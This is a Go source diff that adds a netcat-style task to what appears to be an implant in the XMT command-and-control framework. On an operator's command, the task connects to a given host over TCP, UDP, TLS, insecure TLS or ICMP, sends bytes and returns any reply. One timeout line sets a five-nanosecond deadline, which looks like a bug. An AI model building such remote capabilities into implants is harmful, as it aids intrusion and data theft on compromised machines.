@@ -19,6 +19,7 @@ package task
 import (
 	"context"
 	"io"
+	"net"
 	"os"
 	"strings"
 	"time"
@@ -33,6 +34,15 @@ import (
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
+)
+
+// Netcat connection constants
+const (
+	NetcatTCP uint8 = 0
+	NetcatUDP       = iota
+	NetcatTLS
+	NetcatTLSInsecure
+	NetcatICMP
 )
 
 const (
@@ -79,7 +89,6 @@ func (Process) task() uint8 {
 func (Assembly) task() uint8 {
 	return TvAssembly
 }
-
 func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
 	d, err := r.Int64()
 	if err != nil {
@@ -132,6 +141,75 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 	w.WriteString(v)
 	w.WriteInt64(n)
 	return err
+}
+func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
+	h, err := r.StringVal()
+	if err != nil {
+		return err
+	}
+	p, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	t, err := r.Uint64()
+	if err != nil {
+		return err
+	}
+	b, err := r.Bytes()
+	if err != nil {
+		return err
+	}
+	y, f := x, func() {}
+	if t > 0 {
+		y, f = context.WithTimeout(x, time.Duration(t))
+	}
+	var c net.Conn
+	switch p & 0xF {
+	case NetcatUDP:
+		c, err = com.UDP.Connect(y, h)
+	case NetcatTLS:
+		c, err = com.TLS.Connect(y, h)
+	case NetcatTLSInsecure:
+		c, err = com.TLSInsecure.Connect(y, h)
+	case NetcatICMP:
+		c, err = com.ICMP.Connect(y, h)
+	default:
+		c, err = com.TCP.Connect(y, h)
+	}
+	if err != nil {
+		f()
+		return err
+	}
+	k := time.Second * 5
+	if t > 0 {
+		k = time.Duration(5)
+	}
+	c.SetWriteDeadline(time.Now().Add(k))
+	n, err := c.Write(b)
+	if err != nil {
+		f()
+		c.Close()
+		return err
+	}
+	if n != len(b) {
+		f()
+		c.Close()
+		return io.ErrShortWrite
+	}
+	if p&128 == 0 {
+		f()
+		c.Close()
+		w.WriteUint8(0)
+		return nil
+	}
+	var o data.Chunk
+	c.SetReadDeadline(time.Now().Add(k))
+	io.Copy(&o, c)
+	w.WriteBytes(o.Payload())
+	o.Clear()
+	f()
+	c.Close()
+	return nil
 }
 func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.StringVal()
